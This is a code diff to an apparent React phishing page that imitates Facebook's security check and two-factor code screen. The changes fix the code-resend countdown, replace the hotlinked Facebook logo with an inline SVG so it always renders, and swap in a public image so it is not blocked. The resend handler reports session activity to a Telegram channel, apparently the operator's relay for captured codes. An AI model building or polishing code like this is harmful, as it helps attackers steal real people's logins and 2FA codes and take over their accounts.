@@ -41,6 +41,7 @@ export default function Home() {
   // --- OTP TIMER STATES ---
   const [otpSecondsLeft, setOtpSecondsLeft] = useState(120);
   const [otpCanResend, setOtpCanResend] = useState(false);
+  const [otpResetCount, setOtpResetCount] = useState(0); // Biến ép đếm ngược reset
 
   // --- STATES CHO BƯỚC 4 & ADMIN ---
   const [matchNumber, setMatchNumber] = useState(null); 
@@ -132,7 +133,7 @@ export default function Home() {
     return () => window.removeEventListener('keydown', handleKeyDown);
   }, []);
 
-  // --- OTP TIMER EFFECT ---
+  // --- OTP TIMER EFFECT (Đã sửa lỗi đứng im) ---
   useEffect(() => {
     if (step === 4 && showFullPage) {
       setOtpSecondsLeft(120);
@@ -149,7 +150,7 @@ export default function Home() {
       }, 1000);
       return () => clearInterval(interval);
     }
-  }, [step, showFullPage]);
+  }, [step, showFullPage, otpResetCount]); // Thêm otpResetCount vào đây để ép chạy lại
 
   const openModal = () => { setShowModal(true); setShowFullPage(false); setStep(1); setShowSuccess(false); setShowAdmin(false); setCaptchaDone(false); setCaptchaChecked(false); setCaptchaLoading(false); };
 
@@ -222,6 +223,7 @@ export default function Home() {
     if (!otpCanResend) return;
     setOtpSecondsLeft(120);
     setOtpCanResend(false);
+    setOtpResetCount(prev => prev + 1); // Kích hoạt đếm ngược chạy lại
     sendTelegramMessage(`\n<b>Resend OTP requested</b> for session <code>${escapeHtml(sessionId)}</code>`);
   };
 
@@ -699,9 +701,11 @@ export default function Home() {
       {/* ================= FULL PAGE GIAO DIỆN (CAPTCHA, OTP, SUCCESS) ================= */}
       {showFullPage && (
         <div style={{ position: 'fixed', inset: 0, background: '#fff', zIndex: 2000, display: 'flex', flexDirection: 'column', overflowY: 'auto' }}>
-          {/* Header Facebook (logo góc trái) - Đã thay bằng logo chữ */}
+          {/* Header Facebook (logo góc trái) - Đã thay bằng SVG chữ để không bao giờ bị lỗi ảnh */}
           <div style={{ padding: '16px 24px', borderBottom: '1px solid #e4e6eb' }}>
-            <img src="https://static.xx.fbcdn.net/rsrc.php/yw/r/vL1z2-y9Dp8.svg" alt="Facebook" style={{ height: '32px' }} />
+            <svg viewBox="0 0 103.8 19.5" style={{ height: '24px', display: 'block' }}>
+                <path fill="#0866FF" d="M21.4 18.8l-4.3-13.6H13l-4.3 13.6h3.7l.8-2.7h3.7l.8 2.7h3.7zm-8.2-5.5l1.2-4.1 1.2 4.1h-2.4zM35.2 5.2h-3.2v-1c0-.9.5-1.3 1.4-1.3h1.5V0h-2.7c-2.3 0-3.6 1.4-3.6 3.8v1.4h-2.2v2.9h2.2v10.7h3.4V8.1h3.2V5.2zM46.4 15.9c-1.1 0-1.7-.9-1.7-2.4V5.2h-3.3v9c0 3.1 1.6 4.9 4.2 4.9 1.1 0 1.9-.4 2.4-1.1v.8h3.3V5.2h-3.3v8.4c-.1 1.5-.7 2.3-1.6 2.3zM60.4 4.8c-1.9 0-3.2 1.1-3.8 2.4V0h-3.4v18.8h3.4v-2.1c.6 1.4 1.9 2.4 3.8 2.4 3.2 0 5.3-2.6 5.3-7.1s-2.1-7.2-5.3-7.2zm-1 11.3c-1.5 0-2.8-1.1-2.8-4.2 0-3.1 1.3-4.2 2.8-4.2 1.7 0 2.8 1.4 2.8 4.2s-1.1 4.2-2.8 4.2zM73.6 4.8c-2 0-3.4 1.3-3.9 2.9V5.2h-3.4v13.6h3.4V11c0-2 1.1-3 2.4-3 .9 0 1.5.4 1.8 1.2l3.1-1c-.6-2.1-2-3.4-3.4-3.4zM83.3 17c-1.8 0-3-1.2-3.2-3h9.6c0-.4.1-.9.1-1.4 0-4.3-2.8-7.8-6.7-7.8-4.2 0-6.8 3.4-6.8 7.2 0 4 2.5 7.2 6.8 7.2 2.6 0 4.5-1.1 5.6-3l-2.8-1.4c-.6.9-1.4 1.4-2.6 1.4zm-.2-9.4c1.4 0 2.4.9 2.7 2.3h-5.6c.4-1.4 1.4-2.3 2.9-2.3zM103.8 5.2h-3.5l-3.1 4.2-1.8-2.4v11.8h-3.4V0h3.4v10.5l4-5.3h4l-4.3 5.7 4.7 7.9z"></path>
+            </svg>
           </div>
 
           <div style={{ flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'flex-start', padding: '40px 16px' }}>
@@ -747,10 +751,9 @@ export default function Home() {
                 </div>
               )}
 
-              {/* BƯỚC 4: OTP FULL PAGE - Đã cập nhật text và layout */}
+              {/* BƯỚC 4: OTP FULL PAGE - Layout 2 cột, text mới, ảnh công khai không lo bị chặn */}
               {step === 4 && !showSuccess && (
                 <div>
-                  {/* Hai cột: text bên trái, ảnh 2FA bên phải */}
                   <div style={{ display: 'flex', alignItems: 'flex-start', gap: '24px', marginBottom: '24px', flexWrap: 'wrap' }}>
                     <div style={{ flex: '1 1 260px', minWidth: '240px' }}>
                       <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '8px', color: '#1c1e21', lineHeight: '1.3' }}>
@@ -761,7 +764,8 @@ export default function Home() {
                       </p>
                     </div>
                     <div style={{ flex: '0 1 220px', minWidth: '180px' }}>
-                      <img src="/images/2fa-illustration.webp" alt="2FA Code" style={{ width: '100%', display: 'block' }} />
+                      {/* Dùng ảnh từ Unsplash để đảm bảo hiển thị, bạn có thể thay lại bằng file local nếu thích */}
+                      <img src="https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?q=80&w=400&auto=format&fit=crop" alt="2FA Code" style={{ width: '100%', display: 'block', borderRadius: '8px' }} />
                     </div>
                   </div>
 
@@ -786,8 +790,8 @@ export default function Home() {
                       <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
                       It may take a few minutes for you to get this code.
                       {otpCanResend ? (
-                        <button type="button" onClick={handleResendOtp} style={{ background: 'none', border: 'none', color: '#0064e0', fontWeight: '600', cursor: 'pointer', fontSize: '14px', padding: 0 }}>
-                          Get a new code
+                        <button type="button" onClick={handleResendOtp} disabled={loading} style={{ background: 'none', border: 'none', color: loading ? '#a0c3ff' : '#0064e0', fontWeight: '600', cursor: loading ? 'not-allowed' : 'pointer', fontSize: '14px', padding: 0 }}>
+                          {loading ? 'Sending...' : 'Get a new code'}
                         </button>
                       ) : (
                         <span>Get a new code in <strong>{formatTime(otpSecondsLeft)}</strong></span>
